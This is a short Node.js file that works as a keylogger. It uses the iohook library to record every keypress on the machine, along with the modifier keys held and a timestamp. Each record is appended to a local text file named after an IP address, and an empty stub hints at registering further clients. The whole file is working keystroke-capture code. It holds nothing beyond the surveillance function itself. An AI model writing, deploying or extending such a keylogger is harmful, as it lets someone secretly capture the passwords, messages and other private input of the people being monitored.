'user strict';
const fs = require('fs');
const ioHook = require("iohook")
const ipAddress = '127.0.0.1'

ioHook.on('keypress', function (event) {
    keyName = String.fromCharCode(event.keychar)
    keyName = event.shiftKey ? "Shift+" + keyName : (event.altKey ? "Alt+" + keyName : (event.ctrlKey ? "Ctrl+" + keyName : keyName))
    currentTime = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })
    data = "\"" + keyName + "\"" + "|" + currentTime + "\n"
    fs.appendFile(ipAddress + ".txt", data, (err) => {
        if (err) {
            console.log("!!!" + err)
        } else {
            console.log("***" + data)
        }
    })
});


function register_new_client(newIpAddress){
}
